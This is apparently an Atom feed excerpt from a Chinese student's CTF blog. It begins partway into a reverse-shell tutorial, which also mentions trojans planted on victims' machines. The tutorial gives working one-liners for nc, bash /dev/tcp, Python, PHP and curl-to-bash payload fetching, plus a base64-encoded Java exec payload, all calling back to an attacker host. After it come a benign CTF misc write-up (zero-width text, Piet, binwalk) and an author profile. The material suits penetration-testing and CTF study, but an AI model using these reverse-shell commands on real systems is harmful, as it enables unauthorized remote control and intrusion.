某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2. 目标机器的 ip 动态改变，你不能持续控制。</p><p>3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p><h3 id="反弹shell的方式"><a class="markdownIt-Anchor" href="#反弹shell的方式">#</a> 反弹 shell 的方式</h3><h4 id="netcat"><a class="markdownIt-Anchor" href="#netcat">#</a> netcat</h4><p>攻击机开启监听：  <code>nc -lvp Target_port</code></p><p>-lvp：l 监听，v 输出交互过程，p 端口</p><p>靶机连接攻击机：  <code>nc Target_ip Target_port -e /bin/bash</code></p><h4 id="bash"><a class="markdownIt-Anchor" href="#bash">#</a> bash</h4><p>Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash</p><p>同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听</p><p><code>nc -lvp Target_Port</code></p><p>这次我们使用 Bash 结合重定向来反弹 shell</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1</code></p><p>或者  <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1&quot;</code></p><p>推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 <code>/bin/sh: 1:Syntax error:Bad fd number</code></p><p>bash -i 产生 bash 交互环境 &gt;&amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&gt;&amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。</p><p>Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p><p>[关于上述 bash 命令的详细解释](<a class="link" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p><h4 id="pythion反弹shell"><a class="markdownIt-Anchor" href="#pythion反弹shell">#</a> Pythion 反弹 shell</h4><p>同样的我们还是在攻击机开始端口监听， <code>nc -lvp Target_Port</code></p><p>在靶机上执行 <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Target_IP&quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><h4 id="curl反弹shell"><a class="markdownIt-Anchor" href="#curl反弹shell">#</a> curl 反弹 shell</h4><p>简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 下载这个文件并且执行，达到用 Bash 重定向相同的效果</p><p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1</code>  或者 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;</code> ，而 java 的 RCE 需要用 base64 编码，Payload: <code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code></p><p>然后在目标机上执行如下，即可反弹 shell</p><p><code>curl Target_IP|bash</code></p><h4 id="php反弹shell"><a class="markdownIt-Anchor" href="#php反弹shell">#</a> php 反弹 shell</h4><p>攻击机：  <code>nc -nvlp Target_port</code></p><p>靶机：  <code>php -r '$sock=fsockopen(&quot;192.168.37.131&quot;,1234);     exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></p><h4 id="others"><a class="markdownIt-Anchor" href="#others">#</a> <strong>Others</strong></h4><p>反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。</p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反弹shell&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹shell&quot;&gt;#&lt;/a&gt; 反弹 shell&lt;/h1&gt;
&lt;h2 id=&quot;反弹shell-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hgame FINAL WP</title>
    <link href="http://example.com/2024/04/06/Hgame-FINAL-WP/"/>
    <id>http://example.com/2024/04/06/Hgame-FINAL-WP/</id>
    <published>2024-04-06T05:09:37.000Z</published>
    <updated>2024-04-06T15:45:00.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hgame-final-wp"><a class="markdownIt-Anchor" href="#hgame-final-wp">#</a> Hgame FINAL WP</h1><h3 id="author-fc04db"><a class="markdownIt-Anchor" href="#author-fc04db">#</a> author: Fc04dB</h3><h4 id="1看不见的字"><a class="markdownIt-Anchor" href="#1看不见的字">#</a> 1. 看不见的字</h4><p>题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:</p><pre><code>https://yuanfux.github.io/zero-width-web/</code></pre><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png" alt="image-5.png"></p><p>直接得到 flag</p><p>顺便贴一张其他人写的脚本</p><pre><code>import * as z from 'zero-width-lib';// 这是要解密的字符串，包含零宽度字符const encodedString = 'h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFEFF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello';// 使用zero-width-lib的decode方法来解密字符串const decoded = z.decode(encodedString);console.log(decoded);</code></pre><h4 id="2逮虾户"><a class="markdownIt-Anchor" href="#2逮虾户">#</a> 2. 逮虾户</h4><p>附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png" alt="image-1.png"></p><p>打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，<br>信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png" alt="image-2.png"></p><pre><code>q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT</code></pre><p>诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png" alt="image-3.png"></p><p>打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png" alt="image-4.png"></p><pre><code>Hgame&#123;d3j45_i_kn0w&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hgame-final-wp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#hgame-final-wp&quot;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&quot;author-fc04db&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Welcome to Fc04dB&#39;s BLOG</title>
    <link href="http://example.com/2024/04/03/My-New-Post/"/>
    <id>http://example.com/2024/04/03/My-New-Post/</id>
    <published>2024-04-03T12:29:21.000Z</published>
    <updated>2024-05-21T08:58:42.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="welcome-to-fc04dbs-blog"><a class="markdownIt-Anchor" href="#welcome-to-fc04dbs-blog">#</a> Welcome To Fc04dB’s Blog</h1><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405211655294.jpg" alt="2b27b9bbb9e5fe5274d1ea91705834ce_1"></p><h2 id="about-fc04db"><a class="markdownIt-Anchor" href="#about-fc04db">#</a> about Fc04dB</h2><p>A rookie who loves network security</p><p>杭州电子科技大学 <code>Vidar-tram</code>  战队 23 级喜欢 <code>web</code>  的 <code>misc</code>  手</p><p>喜欢⚽，巴塞罗那🟦🟥和梅西🐐</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;welcome-to-fc04dbs-blog&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#welcome-to-fc04dbs-blog&quot;&gt;#&lt;/a&gt; Welcome To Fc04dB’s Blog&lt;/h1&gt;
&lt;p&gt;&lt;img la</summary>
      
    
    
    
    
  </entry>
  
</feed>
